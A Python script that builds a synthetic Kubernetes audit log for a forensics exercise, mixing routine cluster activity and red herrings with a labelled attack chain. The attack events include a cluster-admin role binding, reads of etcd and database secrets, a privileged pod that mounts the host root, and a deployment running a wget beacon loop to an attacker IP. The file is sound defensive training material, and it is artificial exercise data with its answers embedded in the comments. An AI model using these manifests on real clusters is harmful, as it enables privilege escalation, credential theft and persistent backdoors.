#!/usr/bin/env python3
"""Generate synthetic Kubernetes audit log data for forensics exercise.

"""
import json
import uuid
import os

def make_event(timestamp, verb, resource, name=None, namespace=None,
               user="", groups=None, source_ip="", user_agent="",
               api_group="", api_version="v1", subresource=None,
               response_code=200, request_object=None, level="Metadata",
               annotations=None):
    """Create a Kubernetes audit event."""
    # Build requestURI
    if api_group:
        uri = f"/apis/{api_group}/{api_version}"
    else:
        uri = f"/api/{api_version}"
    if namespace:
        uri += f"/namespaces/{namespace}"
    uri += f"/{resource}"
    if name:
        uri += f"/{name}"
    if subresource:
        uri += f"/{subresource}"

    event = {
        "kind": "Event",
        "apiVersion": "audit.k8s.io/v1",
        "level": level,
        "auditID": str(uuid.uuid4()),
        "stage": "ResponseComplete",
        "requestURI": uri,
        "verb": verb,
        "user": {
            "username": user,
            "groups": groups or []
        },
        "sourceIPs": [source_ip],
        "userAgent": user_agent,
        "objectRef": {
            "resource": resource,
            "apiVersion": api_version
        },
        "responseStatus": {
            "metadata": {},
            "code": response_code
        },
        "requestReceivedTimestamp": timestamp,
        "stageTimestamp": timestamp
    }

    if namespace:
        event["objectRef"]["namespace"] = namespace
    if name:
        event["objectRef"]["name"] = name
    if api_group:
        event["objectRef"]["apiGroup"] = api_group
    if subresource:
        event["objectRef"]["subresource"] = subresource
    if request_object:
        event["requestObject"] = request_object
    if annotations:
        event["annotations"] = annotations

    return event


# Common identities
SCHEDULER = ("system:kube-scheduler", ["system:authenticated"], "10.0.0.1", "kube-scheduler/v1.29.0")
CONTROLLER = ("system:kube-controller-manager", ["system:authenticated"], "10.0.0.1", "kube-controller-manager/v1.29.0")
NODE1 = ("system:node:worker-node-1", ["system:nodes", "system:authenticated"], "10.0.1.10", "kubelet/v1.29.0")
NODE2 = ("system:node:worker-node-2", ["system:nodes", "system:authenticated"], "10.0.1.11", "kubelet/v1.29.0")
PROMETHEUS = ("system:serviceaccount:monitoring:prometheus-sa",
              ["system:serviceaccounts", "system:serviceaccounts:monitoring", "system:authenticated"],
              "10.0.3.12", "Prometheus/v2.45.0")
COREDNS = ("system:serviceaccount:kube-system:coredns",
           ["system:serviceaccounts", "system:serviceaccounts:kube-system", "system:authenticated"],
           "10.0.0.3", "coredns")
HPA = ("system:serviceaccount:kube-system:horizontal-pod-autoscaler",
       ["system:serviceaccounts", "system:serviceaccounts:kube-system", "system:authenticated"],
       "10.0.0.1", "kube-controller-manager/v1.29.0")
DEPLOY_BOT = ("system:serviceaccount:ci-cd:deploy-bot",
              ["system:serviceaccounts", "system:serviceaccounts:ci-cd", "system:authenticated"],
              "10.0.4.50", "ArgoCD/v2.9.0")
ADMIN = ("admin@company.com", ["system:masters", "system:authenticated"],
         "10.0.0.5", "kubectl/v1.29.0 (darwin/arm64) kubernetes/44a2c02")

# Victim SA - normal operations
WEBAPP_NORMAL = ("system:serviceaccount:production:webapp-sa",
                 ["system:serviceaccounts", "system:serviceaccounts:production", "system:authenticated"],
                 "10.0.2.45", "Go-http-client/2.0")

# Attacker using stolen webapp-sa token
ATTACKER = ("system:serviceaccount:production:webapp-sa",
            ["system:serviceaccounts", "system:serviceaccounts:production", "system:authenticated"],
            "10.0.15.23", "kubectl/v1.29.0 (linux/amd64) kubernetes/44a2c02")

# Authorization annotations
AUTH_WEBAPP_ROLE = {
    "authorization.k8s.io/decision": "allow",
    "authorization.k8s.io/reason": "RBAC: allowed by RoleBinding \"webapp-binding\" of Role \"webapp-role\" to ServiceAccount \"webapp-sa\" in namespace \"production\""
}
AUTH_DEBUG_BINDING = {
    "authorization.k8s.io/decision": "allow",
    "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"debug-binding\" of ClusterRole \"cluster-admin\" to ServiceAccount \"webapp-sa\" in namespace \"production\""
}


events = []

# ===== PRE-ATTACK: Normal cluster operations =====

# 1. Scheduler binding pod
events.append(make_event(
    "2024-03-15T08:00:12.341592Z", "create", "pods",
    name="web-frontend-7d4f9b8c6-kx2mn", namespace="production",
    user=SCHEDULER[0], groups=SCHEDULER[1], source_ip=SCHEDULER[2], user_agent=SCHEDULER[3],
    subresource="binding"
))

# 2. Controller manager creating replicaset
events.append(make_event(
    "2024-03-15T08:01:03.112845Z", "create", "replicasets",
    name="web-frontend-7d4f9b8c6", namespace="production",
    user=CONTROLLER[0], groups=CONTROLLER[1], source_ip=CONTROLLER[2], user_agent=CONTROLLER[3],
    api_group="apps", api_version="v1"
))

# 3. Node heartbeat
events.append(make_event(
    "2024-03-15T08:01:45.998721Z", "patch", "nodes",
    name="worker-node-1",
    user=NODE1[0], groups=NODE1[1], source_ip=NODE1[2], user_agent=NODE1[3],
    subresource="status"
))

# 4. webapp-sa normal: list configmaps (legitimate pre-compromise activity)
events.append(make_event(
    "2024-03-15T08:02:30.445123Z", "list", "configmaps",
    namespace="production",
    user=WEBAPP_NORMAL[0], groups=WEBAPP_NORMAL[1], source_ip=WEBAPP_NORMAL[2], user_agent=WEBAPP_NORMAL[3],
    annotations=AUTH_WEBAPP_ROLE
))

# 5. Prometheus listing pods
events.append(make_event(
    "2024-03-15T08:03:15.778234Z", "list", "pods",
    namespace="monitoring",
    user=PROMETHEUS[0], groups=PROMETHEUS[1], source_ip=PROMETHEUS[2], user_agent=PROMETHEUS[3]
))

# 6. webapp-sa normal: list pods in production
events.append(make_event(
    "2024-03-15T08:04:00.112433Z", "list", "pods",
    namespace="production",
    user=WEBAPP_NORMAL[0], groups=WEBAPP_NORMAL[1], source_ip=WEBAPP_NORMAL[2], user_agent=WEBAPP_NORMAL[3],
    annotations=AUTH_WEBAPP_ROLE
))

# 7. Admin viewing nodes (benign admin work)
events.append(make_event(
    "2024-03-15T08:04:30.556789Z", "list", "nodes",
    user=ADMIN[0], groups=ADMIN[1], source_ip=ADMIN[2], user_agent=ADMIN[3]
))

# ===== ATTACK PHASE 1: RECONNAISSANCE =====

# 8. ATTACK: List clusterroles (recon)
events.append(make_event(
    "2024-03-15T08:05:00.334521Z", "list", "clusterroles",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    api_group="rbac.authorization.k8s.io", api_version="v1",
    annotations=AUTH_WEBAPP_ROLE
))

# 9. ATTACK: List clusterrolebindings (recon)
events.append(make_event(
    "2024-03-15T08:05:10.112234Z", "list", "clusterrolebindings",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    api_group="rbac.authorization.k8s.io", api_version="v1",
    annotations=AUTH_WEBAPP_ROLE
))

# ===== ATTACK PHASE 2: PRIVILEGE ESCALATION =====

# 10. ATTACK: Create ClusterRoleBinding granting cluster-admin
events.append(make_event(
    "2024-03-15T08:05:22.891234Z", "create", "clusterrolebindings",
    name="debug-binding",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    api_group="rbac.authorization.k8s.io", api_version="v1",
    level="RequestResponse",
    request_object={
        "kind": "ClusterRoleBinding",
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "metadata": {"name": "debug-binding"},
        "subjects": [{"kind": "ServiceAccount", "name": "webapp-sa", "namespace": "production"}],
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"}
    }
))

# ===== BENIGN INTERLUDE =====

# 11. Controller manager updating endpoints
events.append(make_event(
    "2024-03-15T08:06:10.223456Z", "update", "endpoints",
    name="kubernetes", namespace="default",
    user=CONTROLLER[0], groups=CONTROLLER[1], source_ip=CONTROLLER[2], user_agent=CONTROLLER[3]
))

# 12. RED HERRING: Admin listing secrets (normal admin activity)
events.append(make_event(
    "2024-03-15T08:06:30.556789Z", "list", "secrets",
    namespace="default",
    user=ADMIN[0], groups=ADMIN[1], source_ip=ADMIN[2], user_agent=ADMIN[3]
))

# ===== ATTACK PHASE 3: CREDENTIAL ACCESS =====

# 13. ATTACK: List secrets in kube-system
events.append(make_event(
    "2024-03-15T08:07:00.112345Z", "list", "secrets",
    namespace="kube-system",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING
))

# 14. ATTACK: Get etcd-certs secret
events.append(make_event(
    "2024-03-15T08:07:15.445678Z", "get", "secrets",
    name="etcd-certs", namespace="kube-system",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING
))

# 15. ATTACK: List secrets in production
events.append(make_event(
    "2024-03-15T08:07:30.778901Z", "list", "secrets",
    namespace="production",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING
))

# 16. ATTACK: Get db-credentials secret
events.append(make_event(
    "2024-03-15T08:07:45.112234Z", "get", "secrets",
    name="db-credentials", namespace="production",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING
))

# 17. ATTACK: Get api-keys secret
events.append(make_event(
    "2024-03-15T08:08:00.445567Z", "get", "secrets",
    name="api-keys", namespace="production",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING
))

# 18. CoreDNS benign activity
events.append(make_event(
    "2024-03-15T08:08:30.889012Z", "list", "endpoints",
    namespace="kube-system",
    user=COREDNS[0], groups=COREDNS[1], source_ip=COREDNS[2], user_agent=COREDNS[3]
))

# ===== ATTACK PHASE 4: EXECUTION =====

# 19. ATTACK: Create privileged pod in kube-system
events.append(make_event(
    "2024-03-15T08:09:00.223456Z", "create", "pods",
    name="debug-pod", namespace="kube-system",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    level="RequestResponse",
    annotations=AUTH_DEBUG_BINDING,
    request_object={
        "kind": "Pod",
        "apiVersion": "v1",
        "metadata": {"name": "debug-pod", "namespace": "kube-system", "labels": {"app": "debug"}},
        "spec": {
            "hostPID": True,
            "hostNetwork": True,
            "nodeSelector": {"kubernetes.io/hostname": "worker-node-1"},
            "containers": [{
                "name": "debug",
                "image": "alpine:3.19",
                "command": ["/bin/sh", "-c", "sleep infinity"],
                "securityContext": {"privileged": True},
                "volumeMounts": [{"name": "host-root", "mountPath": "/host"}]
            }],
            "volumes": [{"name": "host-root", "hostPath": {"path": "/", "type": "Directory"}}],
            "serviceAccountName": "default"
        }
    }
))

# 20. RED HERRING: CI/CD deploy-bot creating a deployment
events.append(make_event(
    "2024-03-15T08:09:30.556789Z", "create", "deployments",
    name="api-service-v2", namespace="staging",
    user=DEPLOY_BOT[0], groups=DEPLOY_BOT[1], source_ip=DEPLOY_BOT[2], user_agent=DEPLOY_BOT[3],
    api_group="apps", api_version="v1"
))

# 21. Kubelet updating pod status
events.append(make_event(
    "2024-03-15T08:10:00.889012Z", "patch", "pods",
    name="debug-pod", namespace="kube-system",
    user=NODE1[0], groups=NODE1[1], source_ip=NODE1[2], user_agent=NODE1[3],
    subresource="status"
))

# 22. ATTACK: Exec into debug-pod
events.append(make_event(
    "2024-03-15T08:11:00.334567Z", "create", "pods",
    name="debug-pod", namespace="kube-system",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    subresource="exec",
    level="RequestResponse",
    annotations=AUTH_DEBUG_BINDING
))

# ===== ATTACK PHASE 5: PERSISTENCE =====

# 23. ATTACK: Create namespace for persistence
events.append(make_event(
    "2024-03-15T08:12:00.667890Z", "create", "namespaces",
    name="maintenance",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING,
    request_object={
        "kind": "Namespace",
        "apiVersion": "v1",
        "metadata": {"name": "maintenance"}
    }
))

# 24. HPA benign
events.append(make_event(
    "2024-03-15T08:13:00.112345Z", "list", "pods",
    namespace="production",
    user=HPA[0], groups=HPA[1], source_ip=HPA[2], user_agent=HPA[3]
))

# 25. ATTACK: Create persistence deployment with C2 beacon
events.append(make_event(
    "2024-03-15T08:14:00.445678Z", "create", "deployments",
    name="backdoor-deploy", namespace="maintenance",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    api_group="apps", api_version="v1",
    level="RequestResponse",
    annotations=AUTH_DEBUG_BINDING,
    request_object={
        "kind": "Deployment",
        "apiVersion": "apps/v1",
        "metadata": {"name": "backdoor-deploy", "namespace": "maintenance"},
        "spec": {
            "replicas": 1,
            "selector": {"matchLabels": {"app": "maintenance-worker"}},
            "template": {
                "metadata": {"labels": {"app": "maintenance-worker"}},
                "spec": {
                    "containers": [{
                        "name": "worker",
                        "image": "alpine:3.19",
                        "command": ["/bin/sh", "-c",
                                    "while true; do wget -q -O- http://10.0.15.23:8443/beacon; sleep 300; done"]
                    }],
                    "serviceAccountName": "default"
                }
            }
        }
    }
))

# 26. Node2 heartbeat
events.append(make_event(
    "2024-03-15T08:15:00.778901Z", "patch", "nodes",
    name="worker-node-2",
    user=NODE2[0], groups=NODE2[1], source_ip=NODE2[2], user_agent=NODE2[3],
    subresource="status"
))

# 27. RED HERRING: Prometheus getting configmaps
events.append(make_event(
    "2024-03-15T08:15:30.112234Z", "get", "configmaps",
    name="prometheus-config", namespace="monitoring",
    user=PROMETHEUS[0], groups=PROMETHEUS[1], source_ip=PROMETHEUS[2], user_agent=PROMETHEUS[3]
))

# 28. ATTACK: Create service account for persistence
events.append(make_event(
    "2024-03-15T08:16:00.556789Z", "create", "serviceaccounts",
    name="maint-worker-sa", namespace="maintenance",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    annotations=AUTH_DEBUG_BINDING,
    request_object={
        "kind": "ServiceAccount",
        "apiVersion": "v1",
        "metadata": {"name": "maint-worker-sa", "namespace": "maintenance"}
    }
))

# 29. ATTACK: Create RoleBinding granting admin to persistence SA
events.append(make_event(
    "2024-03-15T08:16:30.889012Z", "create", "rolebindings",
    name="maint-admin-binding", namespace="maintenance",
    user=ATTACKER[0], groups=ATTACKER[1], source_ip=ATTACKER[2], user_agent=ATTACKER[3],
    api_group="rbac.authorization.k8s.io", api_version="v1",
    level="RequestResponse",
    annotations=AUTH_DEBUG_BINDING,
    request_object={
        "kind": "RoleBinding",
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "metadata": {"name": "maint-admin-binding", "namespace": "maintenance"},
        "subjects": [{"kind": "ServiceAccount", "name": "maint-worker-sa", "namespace": "maintenance"}],
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "admin"}
    }
))

# 30. webapp-sa normal activity resumes (from legit IP)
events.append(make_event(
    "2024-03-15T08:17:00.112345Z", "list", "pods",
    namespace="production",
    user=WEBAPP_NORMAL[0], groups=WEBAPP_NORMAL[1], source_ip=WEBAPP_NORMAL[2], user_agent=WEBAPP_NORMAL[3],
    annotations=AUTH_WEBAPP_ROLE
))

# 31. Another node heartbeat
events.append(make_event(
    "2024-03-15T08:18:00.445678Z", "patch", "nodes",
    name="worker-node-1",
    user=NODE1[0], groups=NODE1[1], source_ip=NODE1[2], user_agent=NODE1[3],
    subresource="status"
))

# 32. Controller manager reconciliation
events.append(make_event(
    "2024-03-15T08:19:00.778901Z", "update", "deployments",
    name="web-frontend", namespace="production",
    user=CONTROLLER[0], groups=CONTROLLER[1], source_ip=CONTROLLER[2], user_agent=CONTROLLER[3],
    api_group="apps", api_version="v1",
    subresource="status"
))


# Write audit logs to file
os.makedirs("/app/audit-logs", exist_ok=True)
with open("/app/audit-logs/kube-apiserver-audit.jsonl", "w") as f:
    for event in events:
        f.write(json.dumps(event, separators=(",", ":")) + "\n")

print(f"Generated {len(events)} audit log entries at /app/audit-logs/kube-apiserver-audit.jsonl")
